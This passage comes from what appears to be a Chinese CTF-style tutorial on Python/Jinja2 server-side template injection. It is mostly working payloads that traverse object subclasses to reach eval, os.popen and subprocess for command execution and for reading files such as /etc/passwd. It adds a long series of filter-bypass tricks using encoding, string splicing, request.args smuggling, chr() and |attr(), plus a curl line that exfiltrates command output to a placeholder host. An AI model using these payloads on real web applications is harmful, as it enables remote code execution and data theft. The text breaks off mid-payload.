class="hljs-string">&#x27;__builtins__&#x27;</span>]<br></code></pre></td></tr></table></figure><p><code>__builtins__</code>和<code>__builtin__</code>的区别：因为python开始就自动导入了函数到内存中，被称为内置函数，但实际上，python是先导入的内建命名空间，那里面才有许多名字，即内建函数的名称，还有对象，对象就是内建函数本身，然而这些命名空间又是由<code>__builtins__</code>模块中的名字构成，那他和<code>__builtin__</code>的区别呢：如果在主模块<code>__main__</code>,<code>__builtins__</code>直接引用<code>__builtin__</code>模块，此时模块名<code>__builtins__</code>与模块名<code>__builtin__</code>指向的都是同一个模块，即<builtin>内建模块;如果不是在主模块中，那么<code>__builtins__</code>只是引用了<code>__builtin__.__dict__</code></p><p>所以我们可以通过<code>dict</code>属性来调用这些函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>__builtins__.__dict__[<span class="hljs-string">&#x27;exec&#x27;</span>](<span class="hljs-string">&quot;print(&#x27;ok&#x27;)&quot;</span>)<br>ok<br></code></pre></td></tr></table></figure><p>通过内建函数导入包：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>__builtins__.__dict__[<span class="hljs-string">&#x27;__import__&#x27;</span>](<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br>laptop-sfu2of66\<span class="hljs-number">50871</span><br><span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>如果在<code>__builtins__</code>中，部分需要引用的函数被删除。不能直接用dict属性来调用，可以使用reload来重新加载</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">reload(__builtin__)<br></code></pre></td></tr></table></figure><p>再在keys中寻找可利用的函数即可，如file()函数为例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">1</span>].__subclasses__()[<span class="hljs-number">204</span>].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;file&#x27;</span>](<span class="hljs-string">&#x27;E:/passwd&#x27;</span>).read()<br><span class="hljs-comment">#通过read()将结果回显，如果没这个，那么file或者os这些执行命令之后是没有回显的</span><br></code></pre></td></tr></table></figure><p>其实也就是<code>从变量-&gt;对象-&gt;基类-&gt;子类遍历-&gt;全局变量 </code>这个流程去找到我们想要的模板或者函数</p><p>上面的元素链就是通过流程去找到python已经提前导入的<code>builtins</code>模板，再在模板里面找函数</p><p>python提前导入的模板有：</p><p><img src="/wzimg/28.png" alt="c"></p><p>上面就是利用的<code>builtins</code>模板进行操作的</p><p>所以我们需要找<code>__subclasses__[]</code>的序列数，寻找脚本如下，例如我们想执行命令evla函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python">code = <span class="hljs-string">&#x27;eval&#x27;</span>             <span class="hljs-comment"># 查找包含 eval 函数的内建模块的类型</span><br>i = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> ().__class__.__base__.__subclasses__(): <br>   <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(c,<span class="hljs-string">&#x27;__init__&#x27;</span>) <span class="hljs-keyword">and</span> <span class="hljs-built_in">hasattr</span>(c.__init__,<span class="hljs-string">&#x27;__globals__&#x27;</span>) <span class="hljs-keyword">and</span> c.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>] <span class="hljs-keyword">and</span> c.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][code]: <br>          <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#123;&#125; &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(i,c))    <br>   i = i + <span class="hljs-number">1</span><br><br>得到：<br><span class="hljs-number">80</span> &lt;<span class="hljs-class"><span class="hljs-keyword">class</span> &#x27;<span class="hljs-title">_frozen_importlib</span>.<span class="hljs-title">_ModuleLock</span>&#x27;&gt;</span><br><span class="hljs-class">81 &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">_frozen_importlib</span>.<span class="hljs-title">_DummyModuleLock</span>&#x27;&gt;</span><br><span class="hljs-class">82 &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">_frozen_importlib</span>.<span class="hljs-title">_ModuleLockManager</span>&#x27;&gt;</span><br><span class="hljs-class">83 &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">_frozen_importlib</span>.<span class="hljs-title">ModuleSpec</span>&#x27;&gt;</span><br><span class="hljs-class">94 &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">_frozen_importlib_external</span>.<span class="hljs-title">FileLoader</span>&#x27;&gt;</span><br><span class="hljs-class">95 &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">_frozen_importlib_external</span>.<span class="hljs-title">_NamespacePath</span>&#x27;&gt;</span><br><span class="hljs-class">96 &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">_frozen_importlib_external</span>.<span class="hljs-title">_NamespaceLoader</span>&#x27;&gt;</span><br><span class="hljs-class">98 &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">_frozen_importlib_external</span>.<span class="hljs-title">FileFinder</span>&#x27;&gt;</span><br><span class="hljs-class">105 &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">zipimport</span>.<span class="hljs-title">zipimporter</span>&#x27;&gt;</span><br><span class="hljs-class">106 &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">zipimport</span>.<span class="hljs-title">_ZipImportResourceReader</span>&#x27;&gt;</span><br><span class="hljs-class">108 &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">codecs</span>.<span class="hljs-title">IncrementalEncoder</span>&#x27;&gt;</span><br><span class="hljs-class">109 &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">codecs</span>.<span class="hljs-title">IncrementalDecoder</span>&#x27;&gt;</span><br><span class="hljs-class">110 &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">codecs</span>.<span class="hljs-title">StreamReaderWriter</span>&#x27;&gt;</span><br><span class="hljs-class">111 &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">codecs</span>.<span class="hljs-title">StreamRecoder</span>&#x27;&gt;</span><br><span class="hljs-class">139 &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">os</span>.<span class="hljs-title">_wrap_close</span>&#x27;&gt;</span><br><span class="hljs-class">140 &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">os</span>.<span class="hljs-title">_AddedDllDirectory</span>&#x27;&gt;</span><br><span class="hljs-class">141 &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">_sitebuiltins</span>.<span class="hljs-title">Quitter</span>&#x27;&gt;</span><br><span class="hljs-class">142 &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">_sitebuiltins</span>.<span class="hljs-title">_Printer</span>&#x27;&gt;</span><br></code></pre></td></tr></table></figure><p>这些里面就有eval函数</p><p>例如：</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;()<span class="hljs-name">.__class__.__base__.__subclasses__</span>()[80].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](<span class="hljs-name">&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;</span>)&#125;&#125;</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">寻找os模板<br><span class="hljs-comment">#python2</span><br>num = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="hljs-number">1</span>].__subclasses__():<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;os&#x27;</span> <span class="hljs-keyword">in</span> item.__init__.__globals__:<br>            <span class="hljs-built_in">print</span> num,item<br>        num+=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">except</span>:<br>        num+=<span class="hljs-number">1</span><br><br><span class="hljs-comment">#72 &lt;class &#x27;site._Printer&#x27;&gt;</span><br><span class="hljs-comment">#77 &lt;class &#x27;site.Quitter&#x27;&gt;</span><br></code></pre></td></tr></table></figure><h3 id="undefined类型"><a href="#undefined类型" class="headerlink" title="undefined类型"></a>undefined类型</h3><p>这里还有一个骚姿势：</p><p>先放payload：</p><p><code>&#123;&#123;a.__init__.__globals__.__builtins__.eval("__import__('os').popen('whoami').read()")&#125;&#125;</code></p><p><code>&#123;&#123;().__class__.__base__.__subclasses__().c.__init__.__globals__['__builtins__']['eval']('abs(-1)')&#125;&#125;</code></p><p>即没有寻找subclasses的位置就能获得没有重载的类</p><p>原因如下：</p><p>因为<code>&#123;&#123;().__class__.__base__.__subclasses__().c.__init__&#125;&#125;</code>得到的是一个undefined类型，也就是说如果碰到未定义的变量就会返回为Undefined类型，所以同理没有定义的变量也是undefined<code>&#123;&#123;a.__init__.__globals__.__builtins__&#125;&#125;</code></p><h3 id="可用类积累："><a href="#可用类积累：" class="headerlink" title="可用类积累："></a>可用类积累：</h3><p><code>__init.__globals__[&#39;os&#39;].popen(&quot;ls&quot;).read()</code>   利用的是全局变量里面的os类</p><p><code>os.wraper</code>类 :找到类加<code>__init__.__globals__.popen(&quot;ls&quot;).read()</code>   //利用的是os类里面得popen方法</p><p> <code>file</code>函数 :python2才有 直接读取文件：<code>[].__class__.__bases__[0].__subclasses__()[40](&#39;/etc/passwd&#39;).read()</code> </p><p><code>_frozen_importlib.BuiltinImporter</code>类：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;()[<span class="hljs-string">&quot;__class__&quot;</span>][<span class="hljs-string">&quot;__bases__&quot;</span>][<span class="hljs-number">0</span>][<span class="hljs-string">&quot;__subclasses__&quot;</span>]()[<span class="hljs-number">80</span>][<span class="hljs-string">&quot;load_module&quot;</span>](<span class="hljs-string">&quot;os&quot;</span>)[<span class="hljs-string">&quot;system&quot;</span>](<span class="hljs-string">&quot;ls&quot;</span>)&#125;&#125;<br>//用&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> &#x27;<span class="hljs-title">_frozen_importlib</span>.<span class="hljs-title">BuiltinImporter</span>&#x27;&gt;这个去执行命令</span><br>&#123;&#123;()[&quot;__class__&quot;][&quot;__bases__&quot;][0][&quot;__subclasses__&quot;]()[91][&quot;get_data&quot;](0, &quot;app.py&quot;)&#125;&#125;<br>//用&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> &#x27;<span class="hljs-title">_frozen_importlib_external</span>.<span class="hljs-title">FileLoader</span>&#x27;&gt;这个去读取文件</span><br></code></pre></td></tr></table></figure><p><code>eval</code>方法：利用类似下面</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;% <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;<br>&#123;% <span class="hljs-keyword">if</span> c.__name__ == <span class="hljs-string">&#x27;catch_warnings&#x27;</span> %&#125;<br>  &#123;% <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> c.__init__.__globals__.values() %&#125;<br>  &#123;% <span class="hljs-keyword">if</span> b.__class__ == &#123;&#125;.__class__ %&#125;<br>    &#123;% <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;eval&#x27;</span> <span class="hljs-keyword">in</span> b.keys() %&#125;<br>      &#123;&#123; b[<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&#x27;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&#x27;</span>) &#125;&#125;<br>    &#123;% endif %&#125;<br>  &#123;% endif %&#125;<br>  &#123;% endfor %&#125;<br>&#123;% endif %&#125;<br>&#123;% endfor %&#125;<br></code></pre></td></tr></table></figure><p><code>subprocess.Popen</code>类：（不需要<code>__globals__</code>）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">[].__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">258</span>](<span class="hljs-string">&#x27;cat /flasklight/coomme_geeeett_youur_flek&#x27;</span>,shell=<span class="hljs-literal">True</span>,stdout=-<span class="hljs-number">1</span>).communicate()[<span class="hljs-number">0</span>].strip()<br></code></pre></td></tr></table></figure><p><code>url_for.__globals__[&#39;__builtins__&#39;].__import__(&#39;os&#39;).popen(&#39;dir&#39;).read()</code>   利用内建函数<code>__builtins__</code>寻找可利用类或者导入包</p><h3 id="绕过姿势"><a href="#绕过姿势" class="headerlink" title="绕过姿势"></a>绕过姿势</h3><ol><li><p>当关键字符被过滤的时候，可以采用引号进行拼接</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;<span class="hljs-string">&quot;&quot;</span>[<span class="hljs-string">&quot;__cla&quot;</span>+<span class="hljs-string">&quot;ss__&quot;</span>]&#125;&#125;<br></code></pre></td></tr></table></figure><p>或者使用base64编码绕过,用于<code>__getattribute__</code>使用实例访问属性时。</p><p>例如：calss</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;[].__getattribute__(X19jbGFzc19<span class="hljs-string">f&#x27;.decode(&#x27;</span>base64<span class="hljs-string">&#x27;))&#125;&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;</span>X19idWlsdGluc19<span class="hljs-string">f&#x27;.decode(&#x27;</span>base64<span class="hljs-string">&#x27;)][&#x27;</span>ZXZhbA==<span class="hljs-string">&#x27;.decode(&#x27;</span>base64<span class="hljs-string">&#x27;)](&#x27;</span>X19pbXBvcnRfXygib3MiKS5wb3BlbigibHMgLyIpLnJlYWQoKQ==<span class="hljs-string">&#x27;.decode(&#x27;</span>base64<span class="hljs-string">&#x27;))&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>利用Unicode编码绕过关键字（flask适用）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;().__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f&#x27;</span>][<span class="hljs-string">&#x27;\u0065\u0076\u0061\u006c&#x27;</span>](<span class="hljs-string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;</span>)&#125;&#125;<br><br>&#123;&#123;().__class__.__base__.__subclasses__()[<span class="hljs-number">77</span>].__init__.__globals__[<span class="hljs-string">&#x27;\u006f\u0073&#x27;</span>].popen(<span class="hljs-string">&#x27;\u006c\u0073\u0020\u002f&#x27;</span>).read()&#125;&#125;<br></code></pre></td></tr></table></figure><p>等同于：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;().__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;</span>)&#125;&#125;<br><br>&#123;&#123;().__class__.__base__.__subclasses__()[<span class="hljs-number">77</span>].__init__.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&#x27;ls /&#x27;</span>).read()&#125;&#125;<br></code></pre></td></tr></table></figure><p>利用Hex编码绕过：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;().__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f&#x27;</span>][<span class="hljs-string">&#x27;\x65\x76\x61\x6c&#x27;</span>](<span class="hljs-string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;</span>)&#125;&#125;<br><br>&#123;&#123;().__class__.__base__.__subclasses__()[<span class="hljs-number">77</span>].__init__.__globals__[<span class="hljs-string">&#x27;\x6f\x73&#x27;</span>].popen(<span class="hljs-string">&#x27;\x6c\x73\x20\x2f&#x27;</span>).read()&#125;&#125;<br></code></pre></td></tr></table></figure><p>等同于：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;().__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;</span>)&#125;&#125;<br><br>&#123;&#123;().__class__.__base__.__subclasses__()[<span class="hljs-number">77</span>].__init__.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&#x27;ls /&#x27;</span>).read()&#125;&#125;<br></code></pre></td></tr></table></figure><p>利用join()函数绕过：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">[].__class__.__base__.__subclasses__()[<span class="hljs-number">40</span>](<span class="hljs-string">&quot;fla&quot;</span>.join(<span class="hljs-string">&quot;/g&quot;</span>)).read() <br></code></pre></td></tr></table></figure><p>利用列表选择：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">[<span class="hljs-string">&#x27;_1_1c1l1a1s1s1_1_1&#x27;</span>[::<span class="hljs-number">2</span>]]   <span class="hljs-comment">#就是选择跳一个的字</span><br>等同于：<br>[__class__]<br></code></pre></td></tr></table></figure></li><li><p>当引号被过滤的时候，可以使用<code>request.args</code></p><p>直接上例子比较好：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;().__class__.__bases__.__getitem__(<span class="hljs-number">0</span>).__subclasses__().pop(<span class="hljs-number">40</span>)(request.args.path).read()&#125;&#125;&amp;path=/etc/passwd<br></code></pre></td></tr></table></figure><p>就是把<code>&#123;&#123;&#125;&#125;`里面的东西放在外面，再调用至`&#123;&#123;&#125;&#125;</code>里面，</p><p>注意：其实不止引号可以这样，关键字也是一样的：例如，一些关键字和引号都被过滤的时候</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">?name=&#123;&#123;()[request.args.a].__mro__[1][request.args.b]()[177][request.args.c].__globals__[request.args.d][request.args.e](request.args.f)[request.args.g]&#125;&#125;&amp;a=__class__&amp;b=__subclasses__&amp;c=__init__&amp;d=__builtins__&amp;e=open&amp;f=c:/windows/win.ini&amp;g=read<br></code></pre></td></tr></table></figure><p>如果<code>args</code>被过滤了，使用<code>request.values</code>也可以，而且POST和GET传递的数据<code>request.values</code>都可以接受</p><p>还有其他绕过方式：</p><p>利用<code>chr</code>函数，先查出来<code>chr</code>函数在哪里</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">&#123;<span class="hljs-literal">()</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__bases__</span>[</span></span><span class="hljs-number">0</span>].<span class="hljs-constructor">__subclasses__()</span><span class="hljs-literal">[§<span class="hljs-number">0</span>§]</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__init__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__globals__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__builtins__</span>.</span></span>chr&#125;&#125;<br></code></pre></td></tr></table></figure><p>通过<code>payload</code>爆破<code>subclasses</code>，获取某个<code>subclasses</code>中含有<code>chr</code>的类索引，</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">&#123;%set+chr=<span class="hljs-literal">[]</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__bases__</span>[</span></span><span class="hljs-number">0</span>].<span class="hljs-constructor">__subclasses__()</span><span class="hljs-literal">[<span class="hljs-number">77</span>]</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__init__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__globals__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__builtins__</span>.</span></span>chr%&#125;<br></code></pre></td></tr></table></figure><p>接着尝试使用chr尝试绕过引号</p><figure class="highlight hy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs hy">&#123;%set+chr=[].__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">77</span>].__init__.__globals__.__builtins__.chr%&#125;&#123;&#123;[].__class__.__mro__[<span class="hljs-number">1</span>].__subclasses__()[<span class="hljs-number">300</span>].__init__.__globals__[chr(<span class="hljs-number">111</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">115</span>)][chr(<span class="hljs-number">112</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">111</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">112</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">101</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">110</span>)](<span class="hljs-name"><span class="hljs-builtin-name">chr</span></span>(<span class="hljs-number">108</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">115</span>)).read()&#125;&#125;<br></code></pre></td></tr></table></figure></li><li><p>过滤<code>[]</code>等括号</p><p>使用<code>__gititem__</code>绕过。如原poc <code>&#123;&#123;"".class.bases[0]&#125;&#125;</code></p><p>绕过后<code>&#123;&#123;"".class.bases.getitem(0)&#125;&#125;</code></p><p>或者pop()函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__.__getitem__(<span class="hljs-number">2</span>).__subclasses__()[<span class="hljs-number">100</span>]<br><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__.__getitem__(<span class="hljs-number">2</span>).__subclasses__().pop(<span class="hljs-number">100</span>)<br></code></pre></td></tr></table></figure><p>尽量不用pop()函数来绕过</p></li><li><p>过滤小括号</p><p>这没办法绕过了，无法执行任何函数，就只能获得个敏感数据了，如config，其实这就是上文所说的查看配置信息</p></li><li><p>过滤<code>&#123;&#123;&#125;&#125;（dns外带）`   <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;% <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.func_globals.linecache.os.popen(<span class="hljs-string">&#x27;curl http://xx.xxx.xx.xx:8080/?i=`whoami`&#x27;</span>).read()==<span class="hljs-string">&#x27;p&#x27;</span> %&#125;<span class="hljs-number">1</span>&#123;% endif %&#125;<br></code></pre></td></tr></table></figure>6. 过滤点号   在Python环境中(Python2/Python3)，我们可以使用访问字典的方式来访问函数/类等。   <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;</span>.__class__等价于<span class="hljs-string">&quot;&quot;</span>[<span class="hljs-string">&quot;__class__&quot;</span>]<br></code></pre></td></tr></table></figure>   或者：   <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;<span class="hljs-string">&quot;&quot;</span>.__getattribute__(<span class="hljs-string">&quot;__cla&quot;</span>+<span class="hljs-string">&quot;ss__&quot;</span>)&#125;&#125;<br></code></pre></td></tr></table></figure>   或者：（`getattr()`  返回一个对象属性值。）   <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">[].__class__ <br><span class="hljs-built_in">getattr</span>([],<span class="hljs-string">&#x27;__class__&#x27;</span>)<br>[].__class__.__base__ <br><span class="hljs-built_in">getattr</span>(<span class="hljs-built_in">getattr</span>([],<span class="hljs-string">&#x27;__class__&#x27;</span>),<span class="hljs-string">&#x27;__base__&#x27;</span>)<br>[].__class__.__base__.__subclasses__()[<span class="hljs-number">59</span>]<br><span class="hljs-built_in">getattr</span>(<span class="hljs-built_in">getattr</span>(<span class="hljs-built_in">getattr</span>([],<span class="hljs-string">&#x27;__class__&#x27;</span>),<span class="hljs-string">&#x27;__base__&#x27;</span>),<span class="hljs-string">&#x27;__subclasses__&#x27;</span>)()[<span class="hljs-number">59</span>]<br>[].__class__.__base__.__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;linecache&#x27;</span>].__dict__[<span class="hljs-string">&#x27;os&#x27;</span>].system(<span class="hljs-string">&#x27;ls&#x27;</span>)<br><span class="hljs-built_in">getattr</span>(<span class="hljs-built_in">getattr</span>(<span class="hljs-built_in">getattr</span>(<span class="hljs-built_in">getattr</span>(<span class="hljs-built_in">getattr</span>(<span class="hljs-built_in">getattr</span>(<span class="hljs-built_in">getattr</span>([],<span class="hljs-string">&#x27;__class__&#x27;</span>),<span class="hljs-string">&#x27;__base__&#x27;</span>),<span class="hljs-string">&#x27;__subclasses__&#x27;</span>)()[<span class="hljs-number">59</span>],<span class="hljs-string">&#x27;__init__&#x27;</span>),<span class="hljs-string">&#x27;__globals__&#x27;</span>)[<span class="hljs-string">&#x27;linecache&#x27;</span>],<span class="hljs-string">&#x27;__dict__&#x27;</span>)[<span class="hljs-string">&#x27;os&#x27;</span>],<span class="hljs-string">&#x27;system&#x27;</span>)(<span class="hljs-string">&#x27;ls&#x27;</span>)<br></code></pre></td></tr></table></figure>   或者：   利用 `|attr()` 绕过（适用于flask）   <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">().__class__   =&gt;  ()|attr(&quot;__class__&quot;)<br></code></pre></td></tr></table></figure>   <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;()|attr(<span class="hljs-string">&quot;__class__&quot;</span>)|attr(<span class="hljs-string">&quot;__base__&quot;</span>)|attr(<span class="hljs-string">&quot;__subclasses__&quot;</span>)()|attr(<span class="hljs-string">&quot;__getitem__&quot;</span>)(<span class="hljs-number">77</span>)|attr(<span class="hljs-string">&quot;__init__&quot;</span>)|attr(<span class="hljs-string">&quot;__globals__&quot;</span>)|attr(<span class="hljs-string">&quot;__getitem__&quot;</span>)(<span class="hljs-string">&quot;os&quot;</span>)|attr(<span 